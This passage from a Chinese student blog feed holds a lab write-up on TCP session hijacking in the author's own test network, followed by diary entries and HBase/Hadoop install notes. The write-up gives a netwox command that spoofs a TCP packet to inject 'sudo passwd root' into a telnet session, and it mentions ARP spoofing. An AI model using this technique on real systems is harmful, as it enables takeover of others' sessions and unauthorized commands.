        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>System: Windows7 x64<br>Software:</p><ul><li>wireshack</li><li>telnet</li><li>netwox/netwag</li><li><a href="https://www.activestate.com/products/tcl/downloads/" target="_blank" rel="noopener">ActiveTcl</a></li><li><a href="https://www.winpcap.org/install/default.htm" target="_blank" rel="noopener">winpcap</a></li><li>Python.socket</li></ul><p>Wireshack 配置<br>编辑 -&gt; 首选项 -&gt; Protocols -&gt; TCP -&gt; uncheck Relative sequence numbers.</p><p>一开始没装winpcap，怎么都发不出去，更别说收到反映了</p><p>System: Linux<br>Software:</p><ul><li>telnetd<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install telnetd</span><br><span class="line">sudo apt-get install xinetd</span><br><span class="line">sudo service xinetd status</span><br></pre></td></tr></table></figure></li></ul><h2 id="从0了解TCP"><a href="#从0了解TCP" class="headerlink" title="从0了解TCP"></a>从0了解TCP</h2><p>其实详细的也没太看，主要就几点<br>首先会话劫持就是伪造一个客户端发向服务端的包，TCP验证就看sequence number和acknowledge number<br>只要抓到了包，知道了这些参数就可以伪造发包了</p><p>其实并没有用到上面那么多工具，最后我还是只用wireshack和netwox(netwxg)，还有用Python.Socket里面的TCP协议通信，从PC(client)到树莓派(server)之间建立连接，然后发包。<br>至于在实际环境中，想要捕获数据包就需要ARP欺骗，让数据包从攻击机过就可以了</p><p>client.py - 客户端绑定端口，方便实验<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">host = <span class="string">'192.168.0.104'</span></span><br><span class="line">port = <span class="number">59999</span></span><br><span class="line">s.bind((host, port))</span><br><span class="line">s.connect((<span class="string">'192.168.0.105'</span>, <span class="number">49999</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode())</span><br><span class="line">    s.send(str(<span class="string">"client calling..."</span>).encode())</span><br><span class="line">    time.sleep(<span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></p><p>server.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">host = <span class="string">'192.168.0.104'</span></span><br><span class="line">port = <span class="number">49999</span></span><br><span class="line">s.bind((host, port))</span><br><span class="line"></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">c, addr = s.accept()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"Connect Address"</span>, addr)</span><br><span class="line">    c.send(<span class="string">"Welcome"</span>.encode())</span><br><span class="line">    print(c.recv(<span class="number">1024</span>).decode())</span><br><span class="line"></span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure></p><p>用wireshark抓包，然后看包里的数据<br>用的是netwox的40 Spoof Ip4Tcp packet命令<br>用netwag构造发包比较方便的，注意最后发送数据telnet是分开发的，每次发几个字符，最后合起来<br>其实也可以一起发的，发送的数据就是要转成二进制形式，在netwag里面只需要加单引号就可以了<br>窗口号是随便写的，注意唯一需要换的就是如果分析的包是从服务器到客户端的，那么acknum和seqnum要换一下，如果分析的就是客户端到服务器的就不需要换了，直接用nextseqnum就可以了<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">40 --ip4-ttl 128 --ip4-protocol 6 --ip4-src 192.168.0.104 --ip4-dst 192.168.0.105 --tcp-src 59999 --tcp-dst 49999 --tcp-seqnum 2775375568 --tcp-acknum 2356415172 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data <span class="string">"'sudo passwd root'"</span></span><br></pre></td></tr></table></figure></p><p>这个样子服务器就可以收到伪造的客户端的包然后执行相应操作</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>socket用raw形式的包，可以直接构造，甚至可以修改协议</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.cnblogs.com/dggsec/p/10136818.html" target="_blank" rel="noopener">TCP回话劫持原理和利用</a></li><li><a href="https://blog.csdn.net/xxx_qz/article/details/70945769" target="_blank" rel="noopener">Attacks on TCP/IP Protocols (Task5) TCP Session Hijacking</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> hack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
            <tag> TCP </tag>
            
            <tag> session hijack </tag>
            
            <tag> wireshack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191106</title>
      <link href="/blog/20191106/"/>
      <url>/blog/20191106/</url>
      
        <content type="html"><![CDATA[<p>最近，<br>专业课项目<br>创马组队<br>text2emoji<br>ros<br>创马项目<br>3d打印<br>jsp作业<br>hadoop作业<br>英语默写</p><p>周末，<br>全体大会<br>面试<br>看牙<br>CodeVita</p><p>难顶..</p><p>JavaScript处理中文<br>我可真是吐了嗷</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191031</title>
      <link href="/blog/20191031/"/>
      <url>/blog/20191031/</url>
      
        <content type="html"><![CDATA[<p>啊…这个月真的是没一个安心的周末…<br>招新、全体大会、出活动…<br>发现我事一多拖延症就犯了…<br>blog笔记也有很久没更了8</p><p>有一说一，真的很不理解为什么大学老师会布置这么多作业？？？我确定我上的是大学不是高中？？？<br>离散数学作业、概率统计作业、Hadoop作业、Hbase作业、JSP作业、数据结构作业…我人傻了</p><p>在开学的时候我的Todolist只有不到10条，现在要滑好久才能滑到底…周常、日常任务也是蛮多的…难顶</p><p>之前和一个同学交流，说我一定可以把时间安排好…sry，最近过得真的很乱…</p><p>不过，目前青协工作差不多告一段落了，不需要我再去出活动了<br>之后的话呢，笔记并不打算及时整理了，应该会在复习阶段集中整理一下</p><p>一个学期过了一半多了，也要规划一下了呢</p><p>抓住万圣节的小辫子，Happy Halloween！</p><p>北屿<br>2019.10.30</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191022</title>
      <link href="/blog/20191022/"/>
      <url>/blog/20191022/</url>
      
        <content type="html"><![CDATA[<p>第一次觉得Minecraft如此优秀，因为Minecraft知道了Java，知道了TeamViewer..<br>今天去帮一个同学搞服务器转发到公网，但是服务器用的是校园网+虚拟机..我咋转发啊..<br>最后用TeamViewer VPN然后做一下本机的端口映射就可了…</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习的下一步</title>
      <link href="/blog/note-the-next-step-for-ml/"/>
      <url>/blog/note-the-next-step-for-ml/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machinelearning </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HBase笔记</title>
      <link href="/blog/note-hbase/"/>
      <url>/blog/note-hbase/</url>
      
        <content type="html"><![CDATA[<h1 id="HBase-Brief-Introduction"><a href="#HBase-Brief-Introduction" class="headerlink" title="HBase Brief Introduction"></a>HBase Brief Introduction</h1><h2 id="What-is-HBase"><a href="#What-is-HBase" class="headerlink" title="What is HBase"></a>What is HBase</h2><p>HBase is an open source KV-type(key-value pair) database of apache, build on top of hdfs, providing a high reliability, high performance, column storage, scalable, real-time read and write database system. It is somewhere between nosql and RDBMS, and can only retrieve data through the primary key(row key) and range of primary key, and only supports single-row transaction(complex operations such as multi-table join can be achieved through hive support). Primarily used to store unstructured and semi-structured loose data.<br>Like hadoop, HBase’s goal is to rely primary on scale-out, increasing computing and storage capabilities by increasing the number of inexpensive commercial servers.<br>HBase, as a typical NOSQL database(NOSQL database = Not only SQL or Non Relational database), can quickly retrieve data through Rowkey, supporting only single-line transaction. The throughput of the cluster can be increased by increasing the availability of inexpensive hardware equipment, relying on HDFS to provide data storage, which guarantees the reliability of the data. Here are some of the technical features of HBase:</p><ul><li>Large capacity: A single table can have ten billion rows, million columns.</li><li>Column-oriented: HBase is column-oriented storage and permission control that dynamically increases columns.</li><li>Sparseness: Empty columns(NULL) do not take up storage space.</li><li>Extensibility: HBase can dynamically increase regionserver.</li><li>High performance: HBase’s unique LSM data structure, very fast through rowkey query.</li></ul><h2 id="Chapter4"><a href="#Chapter4" class="headerlink" title="Chapter4"></a>Chapter4</h2><h3 id="Bloom-filter"><a href="#Bloom-filter" class="headerlink" title="Bloom filter"></a>Bloom filter</h3><p>Key features<br>HBase uses Bloomfilter to improve the performance of Random Reads(Get), which is not useful for Sequential Reading(Scan)</p><h2 id="HBase-Basic-concepts"><a href="#HBase-Basic-concepts" class="headerlink" title="HBase Basic concepts"></a>HBase Basic concepts</h2><h3 id="Table-space"><a href="#Table-space" class="headerlink" title="Table space"></a>Table space</h3><p>In relational database systems, namespace refers to a logical grouping of tables, with similar uses for tables in the same group. The concept of namespace has the following use:</p><ul><li>Quota Management: Limit the resources available to namespace, including region and table.</li><li>Namespace Security Management: Provides another level of multi-tenant security management.</li><li>Region server group: A namespace or table that can be fixed to a set of region servers to ensure data isolation.</li></ul><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">whoami - give the imformation of currently logged <span class="keyword">in</span> user</span><br><span class="line">status - status of hbase with 3 arguements simple, detailed, summary(deault mode)</span><br><span class="line">version - version of hbase </span><br><span class="line"></span><br><span class="line">create_namespace <span class="string">'namespace_name'</span></span><br><span class="line">drop_namespace <span class="string">'namespace_name'</span></span><br><span class="line">list_namespace </span><br><span class="line">change_namespace</span><br><span class="line"><span class="string">'namespace_name'</span> - goto the namespace </span><br><span class="line"></span><br><span class="line">create &lt;namespace&gt;: <span class="string">'table_name'</span>, &#123; NAME =&gt; &lt;family&gt;, VERSIONS =&gt; &lt;VERSIONS&gt;&#125;</span><br><span class="line">list</span><br><span class="line">drop <span class="string">'table_name'</span></span><br><span class="line"><span class="built_in">disable</span> <span class="string">'table_name'</span></span><br><span class="line"><span class="built_in">enable</span> <span class="string">'table_name'</span></span><br><span class="line">is_disabled <span class="string">'table_name'</span></span><br><span class="line">is_enabled <span class="string">'table_name'</span></span><br><span class="line">exists <span class="string">'table_name'</span></span><br><span class="line">descibe <span class="string">'table_name'</span></span><br><span class="line">scan <span class="string">'table_name'</span></span><br><span class="line">alter <span class="string">'table_name'</span>, &#123; NAME =&gt; &lt;family&gt;, VERSIONS =&gt; &lt;VERSIONS&gt;&#125;</span><br><span class="line"></span><br><span class="line">put &lt;table&gt;, &lt;rowkey&gt;, &lt;family: column&gt;, &lt;value&gt;, &lt;timestamp&gt;</span><br><span class="line">get  &lt;table&gt;, &lt;rowkey&gt;, [&lt;family: column&gt;,...]</span><br><span class="line">count &lt;table&gt;</span><br><span class="line">delete &lt;table&gt;, &lt;rowkey&gt;, &lt;family: column&gt;</span><br><span class="line">deleteall &lt;table&gt;, &lt;rowkey&gt;, &lt;family: column&gt;</span><br><span class="line">truncate &lt;table&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bigdata </tag>
            
            <tag> hbase </tag>
            
            <tag> hadoop </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机CentOS7安装HBase</title>
      <link href="/blog/install-hbase/"/>
      <url>/blog/install-hbase/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/av70796937" target="_blank" rel="noopener">https://www.bilibili.com/video/av70796937</a></p><p><a href="https://archive.apache.org/dist/hbase/1.2.2" target="_blank" rel="noopener">https://archive.apache.org/dist/hbase/1.2.2</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf habase+tab -C ~/app</span><br><span class="line"></span><br><span class="line">cp ~/app/hadoop+tab/etc/hadoop/hdfs-site.xml ~/app/hbase+tab/conf/</span><br><span class="line">cp ~/app/hadoop+tab/etc/hadoop/core-site.xml ~/app/hbase+tab/conf/</span><br></pre></td></tr></table></figure></p><p>hbase-env.sh<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/home/hadoop/app/jdk</span><br><span class="line">Annotated Configure PermSize</span><br></pre></td></tr></table></figure></p><p>hbase-site.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop0:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.dataDir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/home/hadoop/app/tmp/zookeeper<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>vim ~/.bash_profile</code>.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HBASE ENV</span></span><br><span class="line"><span class="built_in">export</span> HBASE_HOME=/home/hadoop/app/hbase-1.2.2/</span><br><span class="line">PATH=<span class="variable">$HBASE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></p><p><code>source ~/.base_profile</code>.</p><p><code>hbase version</code>.<br><code>vim /etc/hosts</code>.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">start-dfs.sh</span><br><span class="line">jps</span><br><span class="line">start-hbase.sh</span><br><span class="line">hbase shell</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/app/hbase/lib</span><br><span class="line">mv slf4j-log4j12-1.7.5.jar slf4j-log4j12-1.7.5.jar.backup</span><br><span class="line">status</span><br><span class="line">list</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">hadoop fs -ls /</span><br><span class="line">hadoop fs -ls /hbase</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> install </category>
          
      </categories>
      
      
        <tags>
            
            <tag> install </tag>
            
            <tag> bigdata </tag>
            
            <tag> hbase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机CentOS7安装Hadoop</title>
      <link href="/blog/install-hadoop/"/>
      <url>/blog/install-hadoop/</url>
      
        <content type="html"><![CDATA[<p>踩坑实验<br>主要浪费的都在网络配置，建议重置一下虚拟机网络再配置，不然容易出问题<br>还有就是Xshell用不了，要更新最新版本..还好我有PuTTY</p><p>安利一波刘老师的视频XD<br><a href="https://www.bilibili.com/video/av69670644?from=search&amp;seid=14704125778684531769" target="_blank" rel="noopener">https://www.bilibili.com/video/av69670644?from=search&seid=14704125778684531769</a></p><p>主机名 hadoop0<br>用户名 hadoop</p><ul><li><p>modtify the hostname<br><code>hostnamectl --static set-hostname hadoop</code></p></li><li><p>change the permission<br><code>vi /etc/sudoers</code>.<br><code>hadoop ALL=(root) NOPASSWD:ALL</code>.</p></li></ul><ul><li>config network<br>建议第一次先不要动这步看看能不能联网，用dhcp自动获取地址康康先，然后再改静态<br>VMware Edit - Virtual Network-VMnet8 - NAT config<br>vmnet8<br>192.168.96.0<br>255.255.255.0<br>192.168.96.2</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">00:0C:29:67:3D:DB</span><br><span class="line">BOOTPROTU=<span class="string">"static"</span></span><br><span class="line">IPADDR=192.168.96.128</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.96.2</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line">DNS2=192.168.86.2</span><br><span class="line"></span><br><span class="line">ping baidu.com</span><br><span class="line">service network restart</span><br></pre></td></tr></table></figure><ul><li>install software</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install vim</span><br><span class="line">sudo yum install net-tools</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">192.168.96.128</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line">cat id_rsa.hub &gt; athorized_keys</span><br><span class="line"></span><br><span class="line">sudo systemctl stop firewalld.service</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> firewalld.service</span><br><span class="line">sudo systemctl status firewalld.service</span><br></pre></td></tr></table></figure><p>xshell<br>xftp<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk+tab -C ~/app</span><br><span class="line">tar -zxvf hadoop+tab -C ~/app</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/app/jdk</span><br><span class="line">sudo vim ~/.bash_profile</span><br></pre></td></tr></table></figure></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JAVA ENV</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/home/hadoop/app/jdk1.8.0_211/</span><br><span class="line">PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HADOOP ENV</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_HOME=/home/hadoop/app/hadoop-2.7.3</span><br><span class="line">PATH=<span class="variable">$HADOOP_HOME</span>/bin:<span class="variable">$HADOOP_HOME</span>/sbin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br><span class="line"><span class="built_in">cd</span> ~/app/hadoop-2.7.4/etc/hadoop</span><br><span class="line">vim hadoop-env.sh</span><br><span class="line">vim core-site.xml</span><br><span class="line"></span><br><span class="line">mkdir ~/app/tmp</span><br></pre></td></tr></table></figure><p>（*）yarn-site.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>（*）mapred-site.xml<br>这个文件一开始没有, 但是官方提供了模板, 拷贝即可<br><code>cp mapred-site.xml.template mapred-site.xml</code>.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>（*）core-site.xml 参考本机设置修改主机名, 并设置临时文件夹路径(没有要手动建立)<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop0:9000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/home/hadoop/app/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>（*）hdfs-site.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.permissions<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hdfs namenode -format</span><br><span class="line"><span class="built_in">cd</span> ~/app/hadoop-2.7.4/sbin</span><br><span class="line">start-all.sh</span><br><span class="line">jps</span><br><span class="line"></span><br><span class="line">sudo chmod 600 ~/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">stop-all.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> install </category>
          
      </categories>
      
      
        <tags>
            
            <tag> install </tag>
            
            <tag> bigdata </tag>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191003</title>
      <link href="/blog/20191003/"/>
      <url>/blog/20191003/</url>
      
